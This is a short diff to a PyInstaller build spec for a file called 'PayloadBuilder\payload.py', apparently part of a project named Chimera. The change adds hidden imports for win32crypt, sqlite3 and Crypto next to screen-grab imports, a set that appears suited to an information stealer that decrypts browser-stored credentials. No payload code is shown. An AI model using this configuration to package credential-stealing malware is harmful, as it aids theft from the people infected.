@@ -2,11 +2,11 @@
 
 
 a = Analysis(
-    ['Chimera\\PayloadBuilder\\payload.py'],
+    ['PayloadBuilder\\payload.py'],
     pathex=[],
     binaries=[],
     datas=[],
-    hiddenimports=['PIL', 'PIL.ImageGrab', 'PIL.Image'],
+    hiddenimports=['PIL', 'PIL.ImageGrab', 'win32crypt', 'sqlite3', 'Crypto'],
     hookspath=[],
     hooksconfig={},
     runtime_hooks=[],
